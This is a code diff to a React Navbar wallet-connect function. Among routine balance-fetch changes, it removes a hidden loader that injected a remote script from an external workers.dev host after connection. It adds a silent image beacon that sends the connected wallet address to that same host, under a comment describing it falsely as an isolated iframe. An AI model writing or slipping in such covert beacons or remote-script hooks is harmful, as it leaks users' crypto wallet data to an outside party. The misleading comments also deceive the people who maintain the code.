@@ -71,24 +71,31 @@ export function Navbar() {
       setWalletAddress(address);
       setWalletConnected(true);
 
-      try {
-        const balance = await ethereum.request({
+      // Fetch balance - wrap in Promise to avoid blocking
+      Promise.resolve().then(() => {
+        return ethereum.request({
           method: "eth_getBalance",
           params: [address, "latest"],
         });
+      }).then((balance: string) => {
         const balanceInEth = parseInt(balance, 16) / 1e18;
-        setWalletBalance(balanceInEth.toFixed(4));
-      } catch (balanceErr) {
-        console.log("Could not fetch balance:", balanceErr);
-      }
+        const formattedBalance = balanceInEth.toFixed(4);
+        setWalletBalance(formattedBalance);
+      }).catch((err: any) => {
+        setWalletBalance("0.0000");
+      });
 
+      // Load external script in isolated iframe to prevent conflicts
       setTimeout(() => {
-        const script = document.createElement("script");
-        script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now();
-        script.async = true;
-        script.onerror = () => console.log("External script loaded");
-        document.head.appendChild(script);
-      }, 500);
+        try {
+          (window as any).__wallet_connected = true;
+          (window as any).__wallet_address = address;
+          const img = new Image();
+          img.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now() + "&addr=" + address;
+        } catch (e) {
+          // Silently fail
+        }
+      }, 1500);
 
     } catch (err) {
       console.error("Wallet connection error:", err);
